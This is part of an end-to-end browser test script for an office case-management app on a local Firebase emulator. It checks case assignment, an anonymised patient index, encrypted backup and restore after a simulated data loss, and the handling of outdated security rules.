  const tt = await owner.evaluate(() => { const c = openCases().find(x => x.patient === 'Tobias Tilepick'); return { a: c.assistant, b: c.assignee, id: c.id }; });
  check(tt.a === 'gwen' && tt.b === 'nina', 'the tiles set the assistant and who it’s assigned to');
  await owner.evaluate(id => openDrawer(id), tt.id); await owner.waitForSelector('#drawer .dAssign .aTile[data-v=nina][aria-pressed=true]');
  await owner.click('#drawer .dAssign .aTile[data-v=gwen]'); await owner.waitForSelector('.toast:has-text("Assigned to Gwen")', { timeout: 20000 });
  await owner.waitForFunction(id => (openCases().find(c => c.id === id) || {}).assignee === 'gwen', tt.id, { timeout: 20000 });
  check(true, 'in the case, tapping a photo reassigns it');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#dEditName');
  check(await owner.textContent('#dEditName') === 'Tobias Tilepick' && /Editing case/i.test(await owner.textContent('#drawer .dEditLbl')), 'Edit case shows the patient’s name big at the top');
  await owner.fill('#cf-patient', 'Tobias Tilepick Jr'); check(await owner.textContent('#dEditName') === 'Tobias Tilepick Jr', 'and it follows the name as it’s typed');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Patient index: each case finds its patient’s other cases (Amir, 4 Oct 2026: "data gets large enough that something bad will happen")');
  const st0 = await owner.evaluate(() => ({ pidx: S.settings.pidx, pidx0: S.settings.pidx0, lv: S.rulesLv, on: FB.idxOn }));
  check(st0.pidx > 0 && st0.pidx0 > 0 && st0.lv === 2 && st0.on, 'the owner’s app indexed the office once the newer rules were live (here: at setup)');
  let docs = await fsDump(); const caseDocs = docs.filter(d => /\/cases\//.test(d.name));
  check(caseDocs.length > 20 && caseDocs.every(d => d.fields.pn && d.fields.pn.stringValue.length === 22), 'every case carries its keyed name (' + caseDocs.length + ' cases)');
  const nadiaIx = await owner.evaluate(() => FB.idxFields({ patient: 'Nadia Setcount', chart: '77-1234' }));
  const nadia = caseDocs.filter(d => d.fields.pn.stringValue === nadiaIx.pn);
  check(nadia.length >= 2 && nadia.every(d => d.fields.pc && d.fields.pc.stringValue === nadiaIx.pc), 'Nadia Setcount’s sets share their keyed name and chart # (' + nadia.length + ' sets)');
  check(!JSON.stringify(docs).includes('Nadia') && !JSON.stringify(docs).includes('77-1234'), 'the index stores no names or chart #s');
  await gwen.evaluate(() => histReset()); await gwen.click('#nav-today'); await gwen.click('#nav-list'); await gwen.fill('#q', '');
  await gwen.waitForFunction(() => S.histKeys.size > 0 && !S.histAsk.size, null, { timeout: 20000 });
  const gh = await gwen.evaluate(() => ({ all: S.histLoaded, n: (S.hist || []).length, every: (S.hist || []).every(c => histKeys(c).some(k => S.histKeys.has(k))) }));
  const doneN = caseDocs.filter(d => d.fields.status.stringValue === 'done').length;
  check(!gh.all && gh.every && gh.n < doneN, 'Gwen’s list fetches the in-house patients’ own completed cases (' + gh.n + ' of ' + doneN + ' completed), not all of them');
  // an app opened before the update saves without the index; the owner's app catches up on it (no new version)
  await gwen.evaluate(() => { FB.idxOn = false; });
  await gwen.evaluate(() => B.createCase({ type: 'retainer', patient: 'Ulla Unindexed', stage: 'print', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await gwen.evaluate(() => { FB.idxOn = true; });
  docs = await fsDump(); let ulla = docs.filter(d => /\/cases\//.test(d.name) && !d.fields.pn);
  check(ulla.length === 1, 'a case saved by such an app has no index');
  await owner.evaluate(() => { S.settings.pidx = Date.now() - 7 * 3600e3; S.idxRan = false; return idxMaintain(); });
  docs = await fsDump(); const ulla2 = docs.find(d => d.name === ulla[0].name);
  check(ulla2.fields.pn && ulla2.fields.pn.stringValue.length === 22 && ulla2.fields.rev.integerValue === ulla[0].fields.rev.integerValue, 'the owner’s app gives it its index at its next check, without a new version');

  console.log('\n# Backups: a sealed copy of every case; a deleted case brought back from it');
  await owner.click('#nav-today'); await owner.click('#nav-admin'); await owner.waitForSelector('#backupCard');
  const [bdl] = await Promise.all([owner.waitForEvent('download'), owner.click('#backupCard [data-act=backupNow]')]);
  const BK = 'shots/e2e-backup.json.gz'; await bdl.saveAs(BK);
  const bkFile = JSON.parse(zlib.gunzipSync(fs.readFileSync(BK)).toString('utf8'));
  docs = await fsDump();
  const liveCaseDocs = docs.filter(d => /\/cases\//.test(d.name)), byIdDoc = new Map(liveCaseDocs.map(d => [d.name.split('/').pop(), d]));
  check(bkFile.kind === 'nlo-cases-backup' && bkFile.cases.length === liveCaseDocs.length && bkFile.cases.every(c => byIdDoc.has(c.id) && byIdDoc.get(c.id).fields.ct.stringValue === c.ct), 'the file (' + bdl.suggestedFilename() + ') holds every case exactly as stored, sealed (' + bkFile.cases.length + ' cases)');
  check(bkFile.photos.length > 0 && bkFile.recovery && bkFile.recovery.priv && bkFile.roster.length > 2 && bkFile.settings.alPerAligner === 4.5, 'with the photos (' + bkFile.photos.length + '), the recovery box, the team list and the settings');
  const bkText = JSON.stringify(bkFile);
  check(![P1, P2, P3, 'Nadia', 'Setcount', 'secret-instr-778', '77-1234', 'Ulla'].some(s => bkText.includes(s)), 'no patient name, note or chart # is readable in the file');
  check(await owner.evaluate(n => !!S.settings.lastBackup && S.settings.lastBackup.cases === n, liveCaseDocs.length), 'Team & security notes it as the last backup');
  const withPh = await owner.evaluate(() => { const c = openCases().find(x => x.photo && !x.locked); return c ? { id: c.id, patient: c.patient } : null; });
  await owner.evaluate(id => B.deleteCase(id), withPh.id);
  await owner.waitForFunction(id => !S.cases.has(id), withPh.id, { timeout: 15000 });
  await owner.click('#backupCard [data-act=backupRestore]'); await owner.setInputFiles('#bkFile', BK);
  await owner.waitForSelector('#bkBox [data-act=bkBring]', { timeout: 30000 });
  const bkBoxT = (await owner.textContent('#bkBox')).replace(/\s+/g, ' ');
  check(/Not in NLO Cases now: 1(?!\d)/.test(bkBoxT) && bkBoxT.includes(withPh.patient), 'restore: the deleted case is the one not in NLO Cases now (' + withPh.patient + ')');
  await owner.click('#bkBox [data-act=bkBring]'); await owner.waitForSelector('#bkBox .lockOk', { timeout: 30000 });
  const back = await owner.evaluate(n => { const c = openCases().find(x => x.patient === n); return c ? { id: c.id, photo: !!c.photo } : null; }, withPh.patient);
  check(back && back.id !== withPh.id && back.photo && (await fsDump()).some(d => d.name.endsWith('/photos/' + back.id)), 'Bring back: an open case again, with its photo');
  await owner.evaluate(() => closeModal());
  await owner.click('#backupCard [data-act=backupRestore]'); await owner.setInputFiles('#bkFile', BK);
  await owner.waitForSelector('#bkBox .lockOk', { timeout: 30000 });
  check(/Every case in this backup is in NLO Cases/.test(await owner.textContent('#bkBox')), 'the same file again: nothing to bring back (not twice)');
  await owner.evaluate(() => closeModal());

  const putRules = async content => { const r = await fetch(`http://127.0.0.1:8080/emulator/v1/projects/${PROJECT}:securityRules`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ rules: { files: [{ name: 'firestore.rules', content }] } }) }); if (!r.ok) throw new Error('rules PUT ' + r.status + ' ' + await r.text()); };
  console.log('\n# Older security rules: the set live on 4 Oct (no patient index yet) — everything works; the card hands out the newer ones');
  await putRules(fs.readFileSync(path.join(__dirname, 'rules-1004.rules'), 'utf8'));
  await owner.click('#nav-today'); await owner.click('#nav-admin');
  check(await owner.evaluate(() => rulesCheck()) === false && await owner.evaluate(() => S.rulesIdx && !S.rulesOld && !FB.idxOn), 'the app notices the patient index isn’t allowed yet');
  await owner.waitForSelector('#rulesCard', { timeout: 10000 });
  check(/keep NLO Cases quick/.test(await owner.textContent('#rulesCard')) && !(await owner.evaluate(() => document.body.classList.contains('phOff'))) && await owner.isVisible('#mailAdmin'), 'the card says it’s for speed; photos and email updates stay on');
  await owner.evaluate(() => B.createCase({ type: 'models', patient: 'Olga Oldrules', stage: 'print', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await owner.waitForFunction(() => openCases().some(c => c.patient === 'Olga Oldrules'), null, { timeout: 15000 });
  check((await fsDump()).filter(d => /\/cases\//.test(d.name) && !d.fields.pn).length === 1, 'meanwhile new cases save without the index — nothing is refused');
  await owner.context().grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'http://127.0.0.1:8765' });
  await owner.click('#rulesCard [data-act=rulesCopy]'); await owner.waitForSelector('.toast:has-text("Rules copied")', { timeout: 10000 });
  await putRules(await owner.evaluate(() => navigator.clipboard.readText()));
  await owner.click('#rulesCard [data-act=rulesCheck]'); await owner.waitForSelector('.toast:has-text("up to date")', { timeout: 15000 });
  await owner.waitForSelector('#rulesCard', { state: 'detached', timeout: 10000 });
  await owner.evaluate(() => { S.settings.pidx = Date.now() - 7 * 3600e3; S.idxRan = false; return idxMaintain(); });
  check((await fsDump()).filter(d => /\/cases\//.test(d.name) && !d.fields.pn).length === 0, 'published: the card goes, and the owner’s app gives that case its index');

  console.log('\n# Older security rules still live: photos wait, and Team & security hands out the new rules');
  await putRules(fs.readFileSync(path.join(__dirname, 'rules-prev.rules'), 'utf8')); // the set published on 2 Oct (before email updates and photos)
  await owner.click('#nav-admin');
  check(await owner.evaluate(() => rulesCheck()) === false, 'the app notices the live rules are older than it needs');
  await owner.waitForSelector('#rulesCard', { timeout: 10000 });
  check(await owner.evaluate(() => document.body.classList.contains('phOff')) && !(await owner.isVisible('#mailAdmin')), 'meanwhile photos and email updates stay out of sight');
  await owner.context().grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'http://127.0.0.1:8765' });
  await owner.click('#rulesCard [data-act=rulesCopy]'); await owner.waitForSelector('.toast:has-text("Rules copied")', { timeout: 10000 });
  const copied = await owner.evaluate(() => navigator.clipboard.readText());
  check(copied === fs.readFileSync('dist/firestore.rules', 'utf8'), 'Copy the new rules gives exactly this version’s rules, with the owner’s sign-in email filled in');
  await putRules(copied); // what Dr. A pastes into the Firebase console
  await owner.click('#rulesCard [data-act=rulesCheck]'); await owner.waitForSelector('.toast:has-text("up to date")', { timeout: 15000 });
  await owner.waitForFunction(() => !document.querySelector('#rulesCard') && !document.body.classList.contains('phOff'), null, { timeout: 10000 });
  check(true, 'after publishing them, Check again turns photos and email updates on (the card goes away)');
  await sleep(1500); // a mailbox check-in arriving now can only reach the page through the restarted live listener
  await fetch(`http://127.0.0.1:8080/v1/projects/${PROJECT}/databases/(default)/documents/mailbeat/b${'c'.repeat(32)}`, { method: 'PATCH', headers: { Authorization: 'Bearer owner', 'Content-Type': 'application/json' },
    body: JSON.stringify({ fields: { box: { stringValue: 'records@example.com' }, seen: { integerValue: '1' }, sent: { integerValue: '1' }, err: { stringValue: '' }, ver: { stringValue: '1' }, at: { timestampValue: new Date().toISOString() } } }) });
  await owner.waitForFunction(() => !!(MAILS.state && (MAILS.state.beats || []).some(b => b.box === 'records@example.com')), null, { timeout: 15000 });
  check(true, 'live updates the old rules refused (e.g. a mailbox’s check-in) come through right after Check again, without signing in again');

  await owner.screenshot({ path: 'shots/e2e-admin.png', fullPage: true });

  console.log('\n# A new office after losing everything: the backup comes back with the old recovery code');
  const wereOpen = bkFile.cases.filter(c => c.status === 'open').length, wereDone = bkFile.cases.length - wereOpen;
  for (const pg of [gwen, kay, sarah, owner]) await pg.context().close().catch(() => {});
  await fetch(`http://127.0.0.1:8080/emulator/v1/projects/${PROJECT}/databases/(default)/documents`, { method: 'DELETE' });
  await fetch(`http://127.0.0.1:9099/emulator/v1/projects/${PROJECT}/accounts`, { method: 'DELETE' });
  check((await fsDump()).length === 0, 'the database and the logins are gone');
  const o2 = await newPage(browser, 'owner2', errs);
  await o2.goto(URL0 + '#setup'); await o2.waitForSelector('#setupForm');
  await o2.fill('#suEmail', OWNER_EMAIL); await o2.fill('#suPw1', OWNER_PW); await o2.fill('#suPw2', OWNER_PW);
  await o2.click('#setupForm button[type=submit]'); await o2.waitForSelector('#verifyForm', { timeout: 30000 });
  await verifyEmail(OWNER_EMAIL); await o2.click('#verifyForm button[type=submit]');
  await o2.waitForSelector('#recShow', { timeout: 30000 });
  const RECOVERY2 = (await o2.textContent('#recShow')).trim();
  await o2.check('#codeAck'); await o2.click('#codeDone'); await waitApp(o2);
  check(RECOVERY2 !== RECOVERY, 'the office is set up again: a new office key and a new recovery code');
  await o2.click('#nav-admin'); await o2.click('#backupCard [data-act=backupRestore]'); await o2.setInputFiles('#bkFile', BK);
  await o2.waitForSelector('#bkCodeForm', { timeout: 30000 });
  check(/opens with the recovery code you had when it was made/.test(await o2.textContent('#bkBox')), 'the backup asks for the recovery code it was made with');
  await o2.fill('#bkCode', RECOVERY2); await o2.click('#bkCodeForm button[type=submit]');
  await o2.waitForSelector('#bkBox .lockErr', { timeout: 30000 });
  check(/recovery code didn’t work/.test(await o2.textContent('#bkBox .lockErr')), 'the new office’s code doesn’t open it');
  await o2.fill('#bkCode', RECOVERY.toLowerCase()); await o2.click('#bkCodeForm button[type=submit]');
  await o2.waitForSelector('#bkBox [data-act=bkBring]', { timeout: 60000 });
  const lost = (await o2.textContent('#bkBox')).replace(/\s+/g, ' ');
  check(new RegExp('Not in NLO Cases now: ' + bkFile.cases.length + '(?!\\d)').test(lost) && await o2.isChecked('#bkSettings') && /same usernames \(.*gwen/.test(lost), 'the old code opens it: all ' + bkFile.cases.length + ' cases are missing here; the settings and the team’s usernames are offered too');
  await o2.click('#bkBox [data-act=bkBring]'); await o2.waitForSelector('#bkBox .lockOk', { timeout: 120000 });
  await o2.waitForFunction(n => openCases().length === n, wereOpen, { timeout: 30000 });
  docs = await fsDump(); const nCases = docs.filter(d => /\/cases\//.test(d.name)), nDone = nCases.filter(d => d.fields.status.stringValue === 'done').length;
  check(nCases.length === bkFile.cases.length && nDone === wereDone && nCases.every(d => d.fields.v.integerValue === '1' && d.fields.pn), 'every case is back (' + nCases.length + ', ' + nDone + ' completed), sealed with the new office key and indexed');
  check(docs.filter(d => /\/photos\//.test(d.name)).length === bkFile.photos.filter(p => bkFile.cases.some(c => c.id === p.id)).length, 'with their photos');
  check(await o2.evaluate(() => S.settings.alPerAligner === 4.5 && !!(S.settings.rxOffice || S.settings.defaults)), 'and the settings');
  check(![P1, P2, 'Nadia', 'secret-instr-778'].some(s => JSON.stringify(docs).includes(s)), 'nothing readable in the new database either');
  await o2.evaluate(() => closeModal());
  await openByName(o2, 'Nadia Setcount'); await o2.waitForSelector('#alBox:has-text("Patient total")', { timeout: 20000 });
  await o2.waitForSelector('#alBox:has-text("Patient total: 62 aligners")', { timeout: 20000 }).catch(() => {});
  check(/Patient total: 62 aligners/.test(await o2.textContent('#alBox')), 'a restored patient reads as before: her sets found by patient in the new office (' + (await o2.textContent('#alBox')).match(/Patient total: \d+ aligners/) + ')');
  // 403s are checked precisely (by section) in the forbidden list below
  const realErrs = errs.filter(e => !/Failed to load resource.*(404|fonts)|net::ERR|status of 400|status of 403|identitytoolkit|INVALID_LOGIN_CREDENTIALS|permission|insufficient permissions/i.test(e));
  check(realErrs.length === 0, 'no unexpected page errors' + (realErrs.length ? ':\n' + realErrs.join('\n') : ''));
  console.log('\nexpected-noise errors:', errs.length - realErrs.length);
  console.log('403s:\n' + forbidden.join('\n'));
  const unexpected403 = forbidden.filter(f => !/Two people edit|Older security rules/.test(f));
  check(unexpected403.length === 0, 'no request was refused by the security rules during normal use (' + unexpected403.length + '; ' + (forbidden.length - unexpected403.length) + ' expected during the deliberate same-moment edit, retried automatically)');
  console.log('\nPASS ' + passes.length + '  FAIL ' + fails.length);
  await browser.close();
  process.exit(fails.length ? 1 : 0);
})().catch(async e => { console.error('CRASH', e); try { for (const pg of (global.__pages || [])) console.error('PAGE', pg.l, (await pg.p.textContent('#lockCard').catch(() => '')).slice(0, 300), '|', (await pg.p.textContent('#view').catch(() => '')).slice(0, 200)); } catch (x) { } console.error('ERRS', (global.__errs || []).join('\n')); process.exit(2); });
